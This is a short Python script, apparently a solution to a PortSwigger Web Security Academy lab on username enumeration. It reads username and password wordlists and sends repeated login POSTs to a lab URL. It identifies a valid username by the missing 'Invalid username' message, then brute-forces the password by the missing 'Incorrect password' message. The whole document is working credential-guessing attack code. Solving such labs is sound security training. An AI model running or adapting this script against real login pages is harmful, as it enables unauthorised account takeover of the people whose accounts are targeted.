# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses


import requests


with open('usernames.txt', 'r') as f:
    usernames = f.read().splitlines()

with open('passwords.txt', 'r') as f:
    passwords = f.read().splitlines()


url = 'https://....web-security-academy.net/login'
found_username = ''
found_password = ''


for username in usernames:
    login_body = {
        'username': username,
        'password': 'lol'
    }
    r = requests.post(url = url, data = login_body)
    if 'Invalid username' not in r.text:
        found_username = username
        break

print('Username: ', found_username)


for password in passwords:
    login_body = {
        'username': found_username,
        'password': password
    }
    r = requests.post(url = url, data = login_body)
    if 'Incorrect password' not in r.text:
        found_password = password
        break

print('Password: ', found_password)
